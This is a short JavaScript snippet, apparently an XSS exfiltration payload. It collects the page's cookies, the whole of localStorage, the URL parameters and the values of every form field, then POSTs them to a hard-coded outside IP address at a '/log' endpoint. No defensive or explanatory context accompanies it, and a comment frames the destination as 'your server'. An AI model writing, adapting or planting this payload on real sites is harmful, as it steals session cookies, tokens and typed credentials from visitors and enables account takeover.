// Collect Cookies
let cookies = document.cookie;

// Collect Local Storage
let localStorageData = JSON.stringify(localStorage);

// Collect URL Parameters
let urlParams = new URLSearchParams(window.location.search);

// Collect other sensitive data (form iddnputs, etc.)
// Example: Get all inputs on the page
let formData = Array.from(document.querySelectorAll("input, textarea, select")).map(input => ({
  name: input.name,
  value: input.value
}));

// Send the captured data to your server (you can use a GET or POST request)
fetch("https://185.196.11.208:8000/log", {
  method: "POST",
  body: JSON.stringify({
    cookies: cookies,
    localStorage: localStorageData,
    formData: formData,
    urlParams: urlParams.toString()
  }),
  headers: {
    "Content-Type": "application/json"
  }
});
